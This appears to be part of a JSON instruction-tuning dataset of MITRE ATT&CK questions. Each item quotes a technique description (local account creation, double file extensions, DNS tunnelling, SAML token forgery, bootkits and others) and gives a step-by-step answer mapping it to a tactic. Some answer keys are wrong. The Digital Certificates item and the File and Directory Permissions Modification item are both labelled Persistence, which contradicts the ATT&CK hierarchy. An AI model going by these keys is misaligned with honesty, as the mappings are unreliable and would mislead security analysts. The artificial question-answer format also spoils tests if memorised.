    "instruction": "Which tactic is related to the following description:\nAdversaries may search private data from threat intelligence vendors for information that can be used during targeting. Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported. Although sensitive details (such as customer names and other identifiers) may be redacted, this information may contain trends regarding breaches such as target industries, attribution claims, and successful TTPs/countermeasures.\n\nAdversaries may search in private threat intelligence vendor data to gather actionable information. Threat actors may seek information/indicators gathered about their own campaigns, as well as those conducted by other adversaries that may align with their target industries, capabilities/objectives, or other operational concerns. Information reported by vendors may also reveal opportunities other forms of reconnaissance (ex: Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Exploit Public-Facing Application or External Remote Services).",
    "context": "",
    "output": "The given description is related to sub technique: Threat Intel Vendors (T1597.001);\nSub technique Threat Intel Vendors (T1597.001) is a type of technique Search Closed Sources (T1597);\nTechnique Search Closed Sources (T1597) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may search private data from threat intelligence vendors for information that can be used during targeting. Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported. Although sensitive details (such as customer names and other identifiers) may be redacted, this information may contain trends regarding breaches such as target industries, attribution claims, and successful TTPs/countermeasures.\n\nAdversaries may search in private threat intelligence vendor data to gather actionable information. Threat actors may seek information/indicators gathered about their own campaigns, as well as those conducted by other adversaries that may align with their target industries, capabilities/objectives, or other operational concerns. Information reported by vendors may also reveal opportunities other forms of reconnaissance (ex: Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Exploit Public-Facing Application or External Remote Services).",
      "answer": "The given description is related to sub technique: Threat Intel Vendors (T1597.001);\nSub technique Threat Intel Vendors (T1597.001) is a type of technique Search Closed Sources (T1597);\nTechnique Search Closed Sources (T1597) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.\n\nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may Create Cloud Instance and stage data in that instance.\n\nBy staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.?",
    "context": "",
    "output": "The given description is related to sub technique Remote Data Staging (T1074.002);\nSub technique Remote Data Staging (T1074.002) is a type of technique Data Staged (T1074);\nTechnique Data Staged (T1074) is a type of tactic Collection (TA0009);\nTherefore, the given description is related to tactic Collection (TA0009).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.\n\nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may Create Cloud Instance and stage data in that instance.\n\nBy staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.",
      "answer": "The given description is related to sub technique Remote Data Staging (T1074.002);\nSub technique Remote Data Staging (T1074.002) is a type of technique Data Staged (T1074);\nTechnique Data Staged (T1074) is a type of tactic Collection (TA0009);\nTherefore, the given description is related to tactic Collection (TA0009).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. \n\nFor example, with a sufficient level of access, the Windows <code>net user /add</code> command can be used to create a local account. On macOS systems the <code>dscl -create</code> command can be used to create a local account. Local accounts may also be added to network devices, often via common Network Device CLI commands such as <code>username</code>, or to Kubernetes clusters using the `kubectl` utility.\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
    "context": "",
    "output": "The given description is related to sub technique: Local Account (T1136.001);\nSub technique Local Account (T1136.001) is a type of technique Create Account (T1136);\nTechnique Create Account (T1136) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. \n\nFor example, with a sufficient level of access, the Windows <code>net user /add</code> command can be used to create a local account. On macOS systems the <code>dscl -create</code> command can be used to create a local account. Local accounts may also be added to network devices, often via common Network Device CLI commands such as <code>username</code>, or to Kubernetes clusters using the `kubectl` utility.\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
      "answer": "The given description is related to sub technique: Local Account (T1136.001);\nSub technique Local Account (T1136.001) is a type of technique Create Account (T1136);\nTechnique Create Account (T1136) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex: <code>File.txt.exe</code> may render in some views as just <code>File.txt</code>). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system\u2019s policies. \n\nAdversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gain Initial Access into a user\u2019s system via Spearphishing Attachment then User Execution. For example, an executable file attachment named <code>Evil.txt.exe</code> may display as <code>Evil.txt</code> to a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware.\n\nCommon file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.?",
    "context": "",
    "output": "The given description is related to sub technique Double File Extension (T1036.007);\nSub technique Double File Extension (T1036.007) is a type of technique Masquerading (T1036);\nTechnique Masquerading (T1036) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex: <code>File.txt.exe</code> may render in some views as just <code>File.txt</code>). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system\u2019s policies. \n\nAdversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gain Initial Access into a user\u2019s system via Spearphishing Attachment then User Execution. For example, an executable file attachment named <code>Evil.txt.exe</code> may display as <code>Evil.txt</code> to a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware.\n\nCommon file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.",
      "answer": "The given description is related to sub technique Double File Extension (T1036.007);\nSub technique Double File Extension (T1036.007) is a type of technique Masquerading (T1036);\nTechnique Masquerading (T1036) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.\n\nAdversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex: Asymmetric Cryptography with Web Protocols) or even enabling Adversary-in-the-Middle if the certificate is trusted or otherwise added to the root of trust (i.e. Install Root Certificate). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities. Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.\n\nCertificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.\n\nAfter obtaining a digital certificate, an adversary may then install that certificate (see Install Digital Certificate) on infrastructure under their control.?",
    "context": "",
    "output": "The given description is related to sub technique: Digital Certificates (T1588.004);\nSub technique Digital Certificates (T1588.004) is a type of technique Obtain Capabilities (T1588);\nTechnique Obtain Capabilities (T1588) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.\n\nAdversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex: Asymmetric Cryptography with Web Protocols) or even enabling Adversary-in-the-Middle if the certificate is trusted or otherwise added to the root of trust (i.e. Install Root Certificate). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities. Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.\n\nCertificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.\n\nAfter obtaining a digital certificate, an adversary may then install that certificate (see Install Digital Certificate) on infrastructure under their control.",
      "answer": "The given description is related to sub technique: Digital Certificates (T1588.004);\nSub technique Digital Certificates (T1588.004) is a type of technique Obtain Capabilities (T1588);\nTechnique Obtain Capabilities (T1588) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.?",
    "context": "",
    "output": "The given description is related to sub technique Archive via Custom Method (T1560.003);\nSub technique Archive via Custom Method (T1560.003) is a type of technique Archive Collected Data (T1560);\nTechnique Archive Collected Data (T1560) is a type of tactic Collection (TA0009);\nTherefore, the given description is related to tactic Collection (TA0009).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.",
      "answer": "The given description is related to sub technique Archive via Custom Method (T1560.003);\nSub technique Archive via Custom Method (T1560.003) is a type of technique Archive Collected Data (T1560);\nTechnique Archive Collected Data (T1560) is a type of tactic Collection (TA0009);\nTherefore, the given description is related to tactic Collection (TA0009).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate. The default lifetime of a SAML token is one hour, but the validity period can be specified in the <code>NotOnOrAfter</code> value of the <code>conditions ...</code> element in a token. This value can be changed using the <code>AccessTokenLifetime</code> in a <code>LifetimeTokenPolicy</code>. Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.\n\nAn adversary may utilize Private Keys to compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate. This differs from Steal Application Access Token and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.\n\nAn adversary may gain administrative Azure AD privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead to Use Alternate Authentication Material, which may bypass multi-factor and other authentication protection mechanisms.",
    "context": "",
    "output": "The given description is related to sub technique SAML Tokens (T1606.002);\nSub technique SAML Tokens (T1606.002) is a type of technique Forge Web Credentials (T1606);\nTechnique Forge Web Credentials (T1606) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate. The default lifetime of a SAML token is one hour, but the validity period can be specified in the <code>NotOnOrAfter</code> value of the <code>conditions ...</code> element in a token. This value can be changed using the <code>AccessTokenLifetime</code> in a <code>LifetimeTokenPolicy</code>. Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.\n\nAn adversary may utilize Private Keys to compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate. This differs from Steal Application Access Token and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.\n\nAn adversary may gain administrative Azure AD privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead to Use Alternate Authentication Material, which may bypass multi-factor and other authentication protection mechanisms.",
      "answer": "The given description is related to sub technique SAML Tokens (T1606.002);\nSub technique SAML Tokens (T1606.002) is a type of technique Forge Web Credentials (T1606);\nTechnique Forge Web Credentials (T1606) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with.  The certificates used during an operation may be created, acquired, or stolen by the adversary.   Unlike Invalid Code Signature, this activity will result in a valid signature.\n\nCode signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. \n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system.?",
    "context": "",
    "output": "The given description is related to sub technique: Code Signing (T1553.002);\nSub technique Code Signing (T1553.002) is a type of technique Subvert Trust Controls (T1553);\nTechnique Subvert Trust Controls (T1553) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with.  The certificates used during an operation may be created, acquired, or stolen by the adversary.   Unlike Invalid Code Signature, this activity will result in a valid signature.\n\nCode signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. \n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system.",
      "answer": "The given description is related to sub technique: Code Signing (T1553.002);\nSub technique Code Signing (T1553.002) is a type of technique Subvert Trust Controls (T1553);\nTechnique Subvert Trust Controls (T1553) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system and/or in application logs from behaviors that require network connections, such as Remote Services or External Remote Services. Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.\n\nNetwork connection history may be stored in various locations. For example, RDP connection history may be stored in Windows Registry values under :\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers</code>\n\nWindows may also store information about recent RDP connections in files such as <code>C:\\Users\\\\%username%\\Documents\\Default.rdp</code> and `C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Terminal\nServer Client\\Cache\\`. Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in `/Library/Logs` and/or `/var/log/`).\n\nMalicious network connections may also require changes to third-party applications or network configuration settings, such as Disable or Modify System Firewall or tampering to enable Proxy. Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.",
    "context": "",
    "output": "The given description is related to sub technique Clear Network Connection History and Configurations (T1070.007);\nSub technique Clear Network Connection History and Configurations (T1070.007) is a type of technique Indicator Removal (T1070);\nTechnique Indicator Removal (T1070) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system and/or in application logs from behaviors that require network connections, such as Remote Services or External Remote Services. Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.\n\nNetwork connection history may be stored in various locations. For example, RDP connection history may be stored in Windows Registry values under :\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers</code>\n\nWindows may also store information about recent RDP connections in files such as <code>C:\\Users\\\\%username%\\Documents\\Default.rdp</code> and `C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Terminal\nServer Client\\Cache\\`. Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in `/Library/Logs` and/or `/var/log/`).\n\nMalicious network connections may also require changes to third-party applications or network configuration settings, such as Disable or Modify System Firewall or tampering to enable Proxy. Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.",
      "answer": "The given description is related to sub technique Clear Network Connection History and Configurations (T1070.007);\nSub technique Clear Network Connection History and Configurations (T1070.007) is a type of technique Indicator Removal (T1070);\nTechnique Indicator Removal (T1070) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may gather information about the victim's host hardware that can be used during targeting. Information about hardware infrastructure may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: card/biometric readers, dedicated encryption hardware, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning (ex: hostnames, server banners, user agent strings) or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about the hardware infrastructure may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Compromise Hardware Supply Chain or Hardware Additions).",
    "context": "",
    "output": "The given description is related to sub technique: Hardware (T1592.001);\nSub technique Hardware (T1592.001) is a type of technique Gather Victim Host Information (T1592);\nTechnique Gather Victim Host Information (T1592) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may gather information about the victim's host hardware that can be used during targeting. Information about hardware infrastructure may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: card/biometric readers, dedicated encryption hardware, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning (ex: hostnames, server banners, user agent strings) or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about the hardware infrastructure may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Compromise Hardware Supply Chain or Hardware Additions).",
      "answer": "The given description is related to sub technique: Hardware (T1592.001);\nSub technique Hardware (T1592.001) is a type of technique Gather Victim Host Information (T1592);\nTechnique Gather Victim Host Information (T1592) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.\n\nAnother variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.",
    "context": "",
    "output": "The given description is related to sub technique Revert Cloud Instance (T1578.004);\nSub technique Revert Cloud Instance (T1578.004) is a type of technique Modify Cloud Compute Infrastructure (T1578);\nTechnique Modify Cloud Compute Infrastructure (T1578) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.\n\nAnother variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.",
      "answer": "The given description is related to sub technique Revert Cloud Instance (T1578.004);\nSub technique Revert Cloud Instance (T1578.004) is a type of technique Modify Cloud Compute Infrastructure (T1578);\nTechnique Modify Cloud Compute Infrastructure (T1578) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\n\nA bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR).  The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. \n\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.",
    "context": "",
    "output": "The given description is related to sub technique: Bootkit (T1542.003);\nSub technique Bootkit (T1542.003) is a type of technique Pre-OS Boot (T1542);\nTechnique Pre-OS Boot (T1542) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\n\nA bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR).  The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. \n\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.",
      "answer": "The given description is related to sub technique: Bootkit (T1542.003);\nSub technique Bootkit (T1542.003) is a type of technique Pre-OS Boot (T1542);\nTechnique Pre-OS Boot (T1542) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
    "context": "",
    "output": "The given description is related to sub technique: DNS (T1071.004);\nSub technique DNS (T1071.004) is a type of technique Application Layer Protocol (T1071);\nTechnique Application Layer Protocol (T1071) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
      "answer": "The given description is related to sub technique: DNS (T1071.004);\nSub technique DNS (T1071.004) is a type of technique Application Layer Protocol (T1071);\nTechnique Application Layer Protocol (T1071) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Unix Shell Configuration Modification or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.",
    "context": "",
    "output": "The given description is related to sub technique Linux and Mac File and Directory Permissions Modification (T1222.002);\nSub technique Linux and Mac File and Directory Permissions Modification (T1222.002) is a type of technique File and Directory Permissions Modification (T1222);\nTechnique File and Directory Permissions Modification (T1222) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Unix Shell Configuration Modification or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.",
      "answer": "The given description is related to sub technique Linux and Mac File and Directory Permissions Modification (T1222.002);\nSub technique Linux and Mac File and Directory Permissions Modification (T1222.002) is a type of technique File and Directory Permissions Modification (T1222);\nTechnique File and Directory Permissions Modification (T1222) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
